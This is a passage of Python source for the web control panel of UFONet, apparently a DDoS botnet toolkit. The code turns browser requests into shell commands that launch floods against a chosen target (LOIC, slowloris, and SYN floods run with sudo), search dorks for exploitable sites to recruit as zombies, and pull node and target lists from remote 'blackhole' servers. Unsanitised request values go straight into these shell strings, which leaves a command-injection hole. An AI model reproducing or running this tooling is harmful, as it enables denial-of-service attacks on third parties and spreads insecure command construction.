  You can use this before to attack to be more effective.

  <button title="Configure how you will perform requests (proxy, HTTP headers, etc)..." onclick="Requests()">Configure requests</button> 

<hr>
  * Set page to crawl: <input type="text" name="target" id="target" size="30" placeholder="http(s)://target.com/list_videos.php">

<hr>
   <button title="Start to search for biggest file on your target..." onClick=Start() style="color:yellow; height:40px; width:240px; font-weight:bold; background-color:red; border: 2px solid yellow;">INSPECT!</button></pre>
</td><td><img src="/images/aliens/alien7.png" onclick="Abduction()"></td>
</tr></table>
 </td>
</tr>
</table>
<hr>
<div id="cmdOut"></div>
""" + self.pages["/footer"]

        self.pages["/lib.js"] = """function loadXMLDoc() {
        var xmlhttp;
        if (window.XMLHttpRequest) {
                // code for IE7+, Firefox, Chrome, Opera, Safari
                xmlhttp = new XMLHttpRequest();
        } else {
                // code for IE6, IE5
                xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        }
        xmlhttp.onreadystatechange = function() {
                if (xmlhttp.readyState == 4 ) {
                   if(xmlhttp.status == 200){
                           document.getElementById("cmdOut").innerHTML = xmlhttp.responseText;
                           setTimeout("loadXMLDoc()", 3000); 
                   }
                }
        }
        xmlhttp.send();
}

function runCommandX(cmd,params) {
        var xmlhttp;
        if (window.XMLHttpRequest) {
                // code for IE7+, Firefox, Chrome, Opera, Safari
                xmlhttp = new XMLHttpRequest();
        } else {
                // code for IE6, IE5
                xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        }
        xmlhttp.onreadystatechange = function() {
                if (xmlhttp.readyState == 4 ) {
                   if(xmlhttp.status == 200){
								if(cmd.indexOf("?")!=-1){
									s=cmd.split("?")
									cmd=s[0]
									params=s[1]
								}
                                document.getElementById("cmdOut").innerHTML = xmlhttp.responseText;
                                //document.getElementById("cmdOut").scrollIntoView();
                                newcmd=cmd
                                if(newcmd=="cmd_list_army"||newcmd=="cmd_view_army"||newcmd=="cmd_list_zombies"||newcmd=="cmd_list_aliens"|| newcmd=="cmd_list_droids"||newcmd=="cmd_list_ucavs"||newcmd=="cmd_list_rpcs"){ //do not refresh listing army
                                    return;
                                } else {
                                if(newcmd=="cmd_test_army" || newcmd=="cmd_test_all" || newcmd=="cmd_test_offline" || newcmd=="cmd_test_rpcs" || newcmd=="cmd_attack" || newcmd=="cmd_refresh_blackholes" || newcmd=="cmd_refresh_news" || newcmd=="cmd_refresh_missions" || newcmd=="cmd_sync_grid" || newcmd=="cmd_sync_board" || newcmd=="cmd_sync_wargames" || newcmd=="cmd_send_message_board" || newcmd=="cmd_transfer_grid" || newcmd=="cmd_transfer_wargame" || newcmd=="cmd_decrypt" || newcmd=="cmd_decrypt_moderator_board" || newcmd=="cmd_decrypt_grid" || newcmd=="cmd_decrypt_wargames" || newcmd=="cmd_inspect" || newcmd=="cmd_abduction" || newcmd=="cmd_download_community" || newcmd=="cmd_upload_community" || newcmd=="cmd_attack_me" || newcmd=="cmd_check_tool" || newcmd=="cmd_edit_supply" || newcmd=="cmd_job_remove" || newcmd=="cmd_job_remove_all" || newcmd=="cmd_job_add" || newcmd =="cmd_job_add_all" || newcmd=="cmd_job_cancel" || newcmd=="cmd_job_cancel_all" || newcmd=="cmd_job_filter" || newcmd=="cmd_grid_filter" || newcmd=="cmd_search") newcmd=newcmd+"_update"
								//do not refresh if certain text on response is found
								if(newcmd.match(/update/) && 
										(
								  xmlhttp.responseText.match(/Botnet updated/) ||
 								  xmlhttp.responseText.match(/Biggest File/) ||
                                                                  xmlhttp.responseText.match(/Abduction finished/) ||
								  xmlhttp.responseText.match(/Not any zombie active/) ||
     								  xmlhttp.responseText.match(/Your target looks OFFLINE/) ||
                                                                  xmlhttp.responseText.match(/Unable to connect to target/) ||
                                                                  xmlhttp.responseText.match(/Something wrong/) ||
                                                                  xmlhttp.responseText.match(/Target url not valid/) ||
                                                                  xmlhttp.responseText.match(/Attack completed/) ||
                                                                  xmlhttp.responseText.match(/You are updated/) ||
                                                                  xmlhttp.responseText.match(/For HELP use:/) ||
                                                                  xmlhttp.responseText.match(/Not any .git repository found/) ||
                                                                  xmlhttp.responseText.match(/End of /) ||
                                                                  xmlhttp.responseText.match(/Exiting /) ||
								  xmlhttp.responseText.match(/Bye/)
										) 
											) return;
                                setTimeout(function(){runCommandX(newcmd,params)}, 3000);
								return;}
                   }
                }
        }
		if(typeof params != "undefined") cmd=cmd+"?"+params
        xmlhttp.open("GET", cmd, true);
        xmlhttp.send();
}
"""
        self.pages["/requests"] = self.html_requests()
        self.pages["/board_profile"] = self.html_board_profile()
        self.pages["/grid_profile"] = self.html_grid_profile()

    def buildGetParams(self, request):
        params = {}
        path = re.findall("^GET ([^\s]+)", request)
        if path:
            path = path[0]
            start = path.find("?")
            if start != -1:
                if path[start+1:start+7] == "zombie":
                    params['zombie']=path[start+8:]
                    return params
                if path[start+1:start+7] == "target":
                    params['target']=path[start+8:]
                    return params
                for param in path[start+1:].split("&"):
                    f = param.split("=")
                    if len(f) == 2:
                        var = f[0]
                        value = f[1]
                        value = value.replace("+", " ")
                        value = urllib.unquote(value)
                        params[var] = value
        return params

    def save_profile(self,pGet):
        # set values for profile configuration from html form to json file
        if "profile_token" in pGet.keys():
            profile_token = pGet["profile_token"]
        else:
            profile_token = self.profile_token
        if "profile_icon" in pGet.keys():
            profile_icon = pGet["profile_icon"]
        else:
            profile_icon = self.profile_icon
        if "profile_nick" in pGet.keys():
            profile_nick = pGet["profile_nick"]
        else:
            profile_nick = self.profile_nick
        # set new values on boardcfg json file 
        with open(self.mothership_boardcfg_file, "w") as f:
            json.dump({"profile_token": profile_token, "profile_icon": profile_icon, "profile_nick": profile_nick}, f, indent=4)

    def save_grid(self,pGet):
        # set values for profile configuration from html form to json file
        if "grid_token" in pGet.keys():
            grid_token = pGet["grid_token"]
        else:
            grid_token = self.grid_token
        if "grid_contact" in pGet.keys():
            grid_contact = pGet["grid_contact"]
        else:
            grid_contact = self.grid_contact
        if "grid_nick" in pGet.keys():
            grid_nick = pGet["grid_nick"]
        else:
            grid_nick = self.grid_nick
        # set new values on gridcfg json file 
        with open(self.mothership_gridcfg_file, "w") as f:
            json.dump({"grid_token": grid_token, "grid_contact": grid_contact, "grid_nick": grid_nick}, f, indent=4)

    def save_cfg(self,pGet):
        # set values for requests configuration from html form to json file
        if "rproxy" in pGet.keys():
            frm_rproxy = pGet["rproxy"]
        else:
            frm_rproxy = self.rproxy
        if "ruseragent" in pGet.keys():
            frm_ruseragent = pGet["ruseragent"]
        else:
            frm_ruseragent = self.ruseragent
        if "rreferer" in pGet.keys():
            frm_rreferer = pGet["rreferer"]
        else:
            frm_rreferer = self.rreferer
        if "rhost" in pGet.keys():
            frm_rhost = pGet["rhost"]
        else:
            frm_rhost = self.rhost
        if "rxforw" in pGet.keys():
            frm_rxforw = pGet["rxforw"]
        else:
            if "update" in pGet.keys():
                frm_rxforw = ""
            else:
                frm_rxforw = self.rxforw
        if "rxclient" in pGet.keys():
            frm_rxclient = pGet["rxclient"]
        else:
            if "update" in pGet.keys():
                frm_rxclient = ""
            else:
                frm_rxclient = self.rxclient
        if "rtimeout" in pGet.keys():
            frm_rtimeout = pGet["rtimeout"]
        else:
            frm_rtimeout = self.rtimeout
        if "rretries" in pGet.keys():
            frm_rretries = pGet["rretries"]
        else:
            frm_rretries = self.rretries
        if "rdelay" in pGet.keys():
            frm_rdelay = pGet["rdelay"]
        else:
            frm_rdelay = self.rdelay
        if "threads" in pGet.keys():
            frm_threads = pGet["threads"]
        else:
            frm_threads = self.threads
        if "rssl" in pGet.keys():
            frm_rssl = pGet["rssl"]
        else:
            if "update" in pGet.keys():
                frm_rssl = ""
            else:
                frm_rssl = self.rssl
        # set new values on webcfg json file 
        with open(self.mothership_webcfg_file, "w") as f:
            json.dump({"rproxy": frm_rproxy, "ruseragent": frm_ruseragent, "rreferer": frm_rreferer, "rhost": frm_rhost, "rxforw": frm_rxforw, "rxclient": frm_rxclient, "rtimeout": frm_rtimeout, "rretries": frm_rretries, "rdelay": frm_rdelay, "threads":frm_threads, "rssl":frm_rssl}, f, indent=4)

    def get(self, request):
        # set request options of the user
        cmd_options = "--proxy='" + self.rproxy + "' --user-agent='" + self.ruseragent + "' --referer='" + self.rreferer + "' --host='" + self.rhost + "' --timeout='" + self.rtimeout + "' --retries='" + self.rretries + "' --delay='" + self.rdelay +"'" + " --threads='"+self.threads+"'"
        if self.rxforw == "on":
            cmd_options = cmd_options + " --xforw"
        if self.rxclient == "on":
            cmd_options = cmd_options + " --xclient"
        if self.rssl == "on":
            cmd_options = cmd_options + " --force-ssl"
        cmd_options = cmd_options + " --force-yes" # no raw_input allowed on webgui
        runcmd = ""
        res = re.findall("^GET ([^\s]+)", request)
        if res is None or len(res)==0:
            return
        pGet = {}
        page = res[0]
        paramStart = page.find("?")
        if paramStart != -1:
            page = page[:paramStart]
            pGet = self.buildGetParams(request)
        if page.startswith("/js/") or page.startswith("/images/")  or page.startswith("/maps/") or page.startswith("/markers/"):
            if os.path.exists("core/"+page[1:]):
                f=open("core/"+page[1:])
                self.pages[page]=f.read()
            elif page == "/js/ajax.js":
                from ajaxmap import AjaxMap
                self.pages[page] = AjaxMap().ajax(pGet)
        if page == "/cmd_check_tool":
            self.pages["/cmd_check_tool"] = "<pre>Waiting for updates results...</pre>"
            runcmd = "(python -i ufonet --update |tee /tmp/out) &"
        if page == "/cmd_check_tool_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_check_tool_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_list_army":
            self.pages["/cmd_list_army"] = "<pre><h1>Total Botnet = "+self.total_botnet+"</h1><table cellpadding='10' cellspacing='10' border='1'><tr><td>UCAVs:</td><td>"+self.num_ucavs+"</td><td>Aliens:</td><td>"+self.num_aliens+"</td></tr><tr><td>Droids:</td><td>"+self.num_droids+"</td><td>Zombies:</td><td>"+self.num_zombies+"</td></tr><tr><td>XML-RPCs:</td><td>"+self.num_rpcs+" </td></tr></table> <hr><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>UCAVs:</u> <b>"+self.num_ucavs+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.ucavs_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_ucavs)+"</td><td></h3>"+'\n'.join(self.ucavs)+"</td></tr></table><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>Aliens:</u> <b>"+self.num_aliens+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.aliens_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_aliens)+"</td><td></h3>"+'\n'.join(self.aliens)+"</td></tr></table><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>Droids:</u> <b>"+self.num_droids+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.droids_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_droids)+"</td><td></h3>"+'\n'.join(self.droids)+"</td></tr></table><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>Zombies:</u> <b>"+self.num_zombies+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.zombies_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_zombies)+"</td><td></h3>"+'\n'.join(self.zombies)+"</td></tr></table><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>XML-RPCs:</u> <b>"+self.num_rpcs+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.rpcs_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_rpcs)+"</td><td></h3>"+'\n'.join(self.rpcs)+"</td></tr></table><br /><br/>"
        if page == "/cmd_list_zombies":
            self.pages["/cmd_list_zombies"] = "<pre><h1>Total Zombies = "+self.num_zombies+"</h1><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>Zombies:</u> <b>"+self.num_zombies+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.zombies_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_zombies)+"</td><td></h3>"+'\n'.join(self.zombies)+"</td></tr></table><br /><br/>"
        if page == "/cmd_list_aliens":
            self.pages["/cmd_list_aliens"] = "<pre><h1>Total Aliens = "+self.num_aliens+"</h1><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>Aliens:</u> <b>"+self.num_aliens+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.aliens_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_aliens)+"</td><td></h3>"+'\n'.join(self.aliens)+"</td></tr></table><br /><br/>"
        if page == "/cmd_list_droids":
            self.pages["/cmd_list_droids"] = "<pre><h1>Total Droids = "+self.num_droids+"</h1><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>Droids:</u> <b>"+self.num_droids+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.droids_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_droids)+"</td><td></h3>"+'\n'.join(self.droids)+"</td></tr></table><br /><br/>"
        if page == "/cmd_list_ucavs":
            self.pages["/cmd_list_ucavs"] = "<pre><h1>Total UCAVs = "+self.num_ucavs+"</h1><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>UCAVs:</u> <b>"+self.num_ucavs+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.ucavs_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_ucavs)+"</td><td></h3>"+'\n'.join(self.ucavs)+"</td></tr></table><br /><br/>"
        if page == "/cmd_list_rpcs":
            self.pages["/cmd_list_rpcs"] = "<pre><h1>Total XML-RPCs = "+self.num_rpcs+"</h1><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>XML-RPCs:</u> <b>"+self.num_rpcs+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.rpcs_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_rpcs)+"</td><td></h3>"+'\n'.join(self.rpcs)+"</td></tr></table><br /><br/>"
        if page == "/cmd_view_army":
            if pGet=={}:
                self.pages["/cmd_view_army"] = self.html_army_map()
        if page == "/cmd_view_attack":
            if 'target' in pGet.keys() != None:
                self.pages["/cmd_view_attack"] = self.html_army_map(pGet['target'])
        if page == "/cmd_test_army":
            self.pages["/cmd_test_army"] = "<pre>Waiting for testing results...</pre>"
            runcmd = "(python -i ufonet -t " + self.zombies_file + " " + cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_test_all":
            self.pages["/cmd_test_all"] = "<pre>Waiting for testing results...</pre>"
            runcmd = "(python -i ufonet --test-all " + cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_test_offline":
            self.pages["/cmd_test_offline"] = "<pre>Waiting for testing results...</pre>"
            runcmd = "(python -i ufonet --test-offline " + cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_attack_me":
            self.pages["/cmd_attack_me"] = "<pre>Waiting for 'attack-me' results...</pre>"
            runcmd = "(python -i ufonet --attack-me " + cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_attack_me_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_attack_me_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_download_community":
            self.pages["/cmd_download_community"] = "<pre>Waiting for downloading results...</pre>"
            runcmd = "(python -i ufonet --download-zombies "+ cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_download_community_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_download_community_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_upload_community":
            self.pages["/cmd_upload_community"] = "<pre>Waiting for uploading results...</pre>"
            runcmd = "(python -i ufonet --upload-zombies "+ cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_upload_community_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_upload_community_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_test_army_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close() 
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_test_army_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_test_all_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_test_all_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_test_offline_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_test_offline_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_test_rpcs":
            self.pages["/cmd_test_rpcs"] = "<pre>Waiting for XML-RPC testing results...</pre>"
            runcmd = "(python -i ufonet --test-rpc " + cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_test_rpcs_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_test_rpcs_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_attack":
            self.pages["/cmd_attack"] = "<pre>Waiting for attacking results...</pre>"
            if pGet["dbstress"]: # Set db stress input point
                if pGet["loic"]: # Set LOIC
                    if pGet["loris"]: # Set LORIS
                        if pGet["ufosyn"]: # Set UFOSYN (executed as root!)
                            runcmd = "(sudo python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' --db '"+pGet["dbstress"]+"' "+ " --loic '"+pGet["loic"]+"' "+ " --loris '"+pGet["loris"]+"' "+ " --ufosyn '"+pGet["ufosyn"]+"' "+cmd_options + "|tee /tmp/out) &"
                        else: # not ufosyn
                            runcmd = "(python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' --db '"+pGet["dbstress"]+"' "+ " --loic '"+pGet["loic"]+"' "+ " --loris '"+pGet["loris"]+"' "+cmd_options + "|tee /tmp/out) &"
                    else: # not loris
                        if pGet["ufosyn"]: # executed as root!
                            runcmd = "(sudo python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' --db '"+pGet["dbstress"]+"' "+ " --loic '"+pGet["loic"]+"' "+ " --ufosyn '"+pGet["ufosyn"]+"' "+cmd_options + "|tee /tmp/out) &"
                        else: # not ufosyn
                            runcmd = "(python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' --db '"+pGet["dbstress"]+"' "+ " --loic '"+pGet["loic"]+"' "+ cmd_options + "|tee /tmp/out) &"
                else: # not loic
                    if pGet["loris"]:
                        if pGet["ufosyn"]: # executed as root!
                            runcmd = "(sudo python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' --db '"+pGet["dbstress"]+"' "+ " --loris '"+pGet["loris"]+"' "+ " --ufosyn '"+pGet["ufosyn"]+"' "+cmd_options + "|tee /tmp/out) &"
                        else: # not ufosyn
                            runcmd = "(python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' --db '"+pGet["dbstress"]+"' "+ " --loris '"+pGet["loris"]+"' "+ cmd_options + "|tee /tmp/out) &"
                    else: # not loris
                        runcmd = "(sudo python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' --db '"+pGet["dbstress"]+"' "+cmd_options + "|tee /tmp/out) &"
            else:# not dbstress
                if pGet["loic"]:
                    if pGet["loris"]:
                        if pGet["ufosyn"]: # executed as root!
                            runcmd = "(sudo python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' --loic '"+pGet["loic"]+"' "+ " --loris '"+pGet["loris"]+"' "+ " --ufosyn '"+pGet["ufosyn"]+"' "+cmd_options + "|tee /tmp/out) &"
                        else: # not ufosyn
                            runcmd = "(python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' --loic '"+pGet["loic"]+"' "+ " --loris '"+pGet["loris"]+"' "+cmd_options + "|tee /tmp/out) &"
                    else: # not loris
                        runcmd = "(python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' --loic '"+pGet["loic"]+"' "+ cmd_options + "|tee /tmp/out) &"
                else: # not loic (normal attack)
                    runcmd = "(python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' "+cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_attack_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close() 
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_attack_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_inspect":
            self.pages["/cmd_inspect"] = "<pre>Waiting for inspecting results...</pre>"
            target = pGet["target"]
            target=urllib.unquote(target).decode('utf8') 
            runcmd = "(python -i ufonet -i '"+target+"' "+ cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_inspect_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_inspect_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_abduction":
            self.pages["/cmd_abduction"] = "<pre>Waiting for abduction results...</pre>"
            target = pGet["target"]
            target=urllib.unquote(target).decode('utf8') 
            runcmd = "(python -i ufonet -x '"+target+"' "+ cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_abduction_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_abduction_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_search":
            self.pages["/cmd_search"] = "<pre>Waiting for search engines results...</pre>"
            if pGet["dork_list"] == "on": # search using dork list (file: dorks.txt)
                if pGet["all_engines"] == "on": # search using all search engines
                    runcmd = "(python -i ufonet --sd 'botnet/dorks.txt' --sa " + cmd_options + "|tee /tmp/out) &"
                else: # search using a search engine
                    runcmd = "(python -i ufonet --sd 'botnet/dorks.txt' --se '"+pGet["s_engine"]+"' " + cmd_options + "|tee /tmp/out) &"
            else: # search using a pattern
                if pGet["autosearch"] == "on": # search using auto-search mod
                    runcmd = "(python -i ufonet --auto-search " + cmd_options + "|tee /tmp/out) &"
                else:
                    if pGet["all_engines"] == "on": # search using all search engines
                        runcmd = "(python -i ufonet -s '"+pGet["dork"]+"' --sa " + cmd_options + "|tee /tmp/out) &"
                    else: # search using a search engine
                        runcmd = "(python -i ufonet -s '"+pGet["dork"]+"' --se '"+pGet["s_engine"]+"' " + cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_search_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_search_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_refresh_blackholes":
            self.pages["/cmd_refresh_blackholes"] = "<pre>Waiting for 'blackhole' reply...</pre>"
            blackhole_ip = pGet["blackholes_source"]
            blackhole_ip = urllib.unquote(blackhole_ip).decode('utf8')
            try:
                blackholes = urllib2.urlopen('http://'+blackhole_ip+'/ufonet/nodes.dat').read()
                f = open(self.blackholes, "w") # write updates to nodes.dat
                f.write(str(blackholes))
                f.close()
                self.blackholes_text = blackholes
            except:
                blackholes = "[Mothership/Error] Something wrong downloading. Try it again or using another source...\n"
            end_mark = "\n[Mothership/Info] End of blackholes list (nodes.dat). Refreshing..."
            f = open("/tmp/out", "w")
            f.write(str(blackholes))
            f.write(end_mark)
            f.close()
        if page == "/cmd_refresh_blackholes_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_refresh_blackholes_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_refresh_news":
            self.pages["/cmd_refresh_news"] = "<pre>Waiting for 'blackhole' reply...</pre>"
            blackhole_ip = pGet["news_source"]
            blackhole_ip = urllib.unquote(blackhole_ip).decode('utf8')
            try:
                news = urllib2.urlopen('http://'+blackhole_ip+'/ufonet/news.txt').read()
                f = open(self.news, "w") # write updates to news.txt
                f.write(str(news))
                f.close()
                self.news_text = news
            except:
                news = "[Mothership/Error] Something wrong downloading. Try it again or using another source....\n"
            end_mark = "\n[Mothership/Info] End of news feed. Refreshing..."
            f = open("/tmp/out", "w")
            f.write(str(news))
            f.write(end_mark)
            f.close()
        if page == "/cmd_refresh_news_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_refresh_news_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_sync_wargames":
            self.pages["/cmd_sync_wargames"] = "<pre>Waiting for 'blackhole' reply...</pre>"
            blackhole_ip = pGet["wargames_source"]
            blackhole_ip = urllib.unquote(blackhole_ip).decode('utf8')
            try:
                wargames = urllib2.urlopen('http://'+blackhole_ip+'/ufonet/wargames.txt').read()
                f = open(self.wargames_file, "w") # write updates to wargames.txt
                f.write(str(wargames))
                f.close()
                self.wargames_text = wargames
            except:
                wargames = "[Mothership/Error] Something wrong downloading. Try it again or using another source...\n"
            end_mark = "\n[Mothership/Info] End of transmission. Refreshing wargames..."
            f = open("/tmp/out", "w")
            f.write(str(wargames))
            f.write(end_mark)
            f.close()
        if page == "/cmd_sync_wargames_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                stream = f.read()
                stream = re.sub("(.{100})", "\\1\n", stream, 0, re.DOTALL) # regex magics! (set visual stream to 100 chars after \n)
                self.pages["/cmd_sync_wargames_update"] = "<pre>"+stream+"<pre>"
        if page == "/cmd_refresh_missions":
            self.pages["/cmd_refresh_missions"] = "<pre>Waiting for 'blackhole' reply...</pre>"
            blackhole_ip = pGet["missions_source"]
            blackhole_ip = urllib.unquote(blackhole_ip).decode('utf8')
            try:
                missions = urllib2.urlopen('http://'+blackhole_ip+'/ufonet/missions.txt').read()
                f = open(self.missions, "w") # write updates to missions.txt
                f.write(str(missions))
                f.close()
                self.missions_text = missions
            except:
                missions = "[Mothership/Error] Something wrong downloading. Try it again or using another source...\n"
            end_mark = "\n[Mothership/Info] End of missions feed. Refreshing..."
            f = open("/tmp/out", "w")
            f.write(str(missions))
            f.write(end_mark)
            f.close()
        if page == "/cmd_refresh_missions_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_refresh_missions_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_sync_grid":
            self.pages["/cmd_sync_grid"] = "<pre>Waiting for 'blackhole' reply...</pre>"
            blackhole_ip = pGet["grid_source"]
            blackhole_ip = urllib.unquote(blackhole_ip).decode('utf8')
            try:
                grid = urllib2.urlopen('http://'+blackhole_ip+'/ufonet/grid.txt').read()
                f = open(self.grid_file, "w") # write updates to grid.txt
                f.write(str(grid))
                f.close()
                self.grid_text = grid
            except:
                grid = "[Mothership/Error] Something wrong downloading. Try it again or using another source...\n"
            end_mark = "\n[Mothership/Info] End of transmission. Refreshing grid..."
            f = open("/tmp/out", "w")
            f.write(str(grid))
            f.write(end_mark)
            f.close()
        if page == "/cmd_sync_grid_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                stream = f.read()
                stream = re.sub("(.{100})", "\\1\n", stream, 0, re.DOTALL) # regex magics! (set visual stream to 100 chars after \n)
                self.pages["/cmd_sync_grid_update"] = "<pre>"+stream+"<pre>"
        if page == "/cmd_job_remove":
            self.pages["/cmd_job_remove"] = "<pre>Removing wargame from your list...</pre>"
            try:
                job_id = pGet["id"]
            except:
                job_id = ""
            if job_id is not "":
                self.list_wargames.reverse() 
                try:
                    job_task = self.list_wargames[(int(job_id)-1)]
                    f = open(self.wargames_file,"r")
                    ls = f.readlines()
                    f.close()
                    f = open(self.wargames_file,"w")
                    for l in ls:
                        if str(l) != str(job_task):
                            f.write(l)
                    f.close()
                except:
                    pass
        if page == "/cmd_job_remove_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_job_remove_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_job_remove_all":
            self.pages["/cmd_job_remove_all"] = "<pre>Purging ALL -CLOSED- wargames from your list...</pre>"
            try:
                key_params = pGet["key"]
                sep = ","
                key = key_params.rsplit(sep, 1)[0]
            except:
                key = ""
            if key is not "":
                try:
                    self.list_wargames.reverse()
                    now = strftime("%d-%m-%Y %H:%M:%S", gmtime())
                    now = strptime(now, "%d-%m-%Y %H:%M:%S")
                    f = open(self.wargames_file,"r")
                    ls = f.readlines()
                    f.close()
                    f = open(self.wargames_file,"w")
                    sep = "#-#"
                    for l in ls:
                        job_estimated = l.rsplit(sep, 1)[1]
                        self.decrypt(key, job_estimated)
                        if self.decryptedtext:
                            job_estimated = self.decryptedtext
                        else:
                            job_estimated = now
                        self.decryptedtext = ""
                        job_estimated = strptime(job_estimated, "%d-%m-%Y %H:%M:%S")
                        if (now >= job_estimated) == False: # -ONGOING-
                            f.write(l)
                    f.close()
                except:
                    pass
        if page == "/cmd_job_remove_all_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
